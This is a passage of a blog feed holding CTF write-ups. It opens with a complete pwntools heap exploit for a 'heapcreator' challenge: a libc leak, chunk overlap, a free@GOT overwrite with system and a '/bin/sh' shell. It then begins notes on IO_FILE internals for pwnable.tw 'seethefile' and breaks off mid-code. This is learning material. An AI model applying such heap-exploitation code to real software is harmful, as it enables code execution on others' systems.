class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./heapcreator&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf =ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./heapcreator&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_got = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;free&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gptr = &lt;span class=&#34;number&#34;&gt;0x006020A0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of Heap : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content of heap:&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content of heap : &amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;b malloc&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;ssss&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_arena = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(main_arena))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset = &lt;span class=&#34;number&#34;&gt;0x7f3d1c53cb78&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x7f3d1c178000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#aimed_addr   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook=main_arena - &lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lib_base = main_arena-offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(lib_base))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr= libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]+lib_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;system : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\xf0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content : &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = u64(r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt; * ( &lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x110&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x110&lt;/span&gt;)+p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = &lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;+ &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x180&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x130&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) +p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;) +p64(free_got)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;,pad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,p64(system_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/03/19/pwnable-seethefile/</guid>
            <title>pwnable_seethefile</title>
            <link>http://example.com/2022/03/19/pwnable-seethefile/</link>
            <category>writeup</category>
            <pubDate>Sat, 19 Mar 2022 21:44:16 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;这篇文章主要是在简单的记录小猫在学习 IO_FILE 时候遇到的一些问题。借用 pwnable.tw 题目 seethefile&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;p  *(struct _IO_FILE_plus *)0x804c410&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb调FILE_PLUS结构体，可以是地址，也可以是stdin等&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;32 位程序：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;h3 id=&#34;question&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#question&#34;&gt;#&lt;/a&gt; question&lt;/h3&gt;
&lt;p&gt;open 打开文件 fp，在未读取数据时候，plus_file 结构体中一部分数据是空的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;number&#34;&gt;0x804c410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72539000&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0xf7fb7cc0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x804c4a8&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x804c4b4&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;39&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时我们看到程序开始有一个很大的堆块&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804c000&lt;/span&gt; PREV_INUSE &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;1033&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不知道这块区域的具体作用，可能是缓存区&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当我们通过 fp 读取数据后，会在对快中开启一个新的空间来储存内容。上述堆块会被更新，内容是我们读入文件名，而 plus_file 的 read 以及 write 部分的指针会指向新开辟的堆块中的数据区域&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 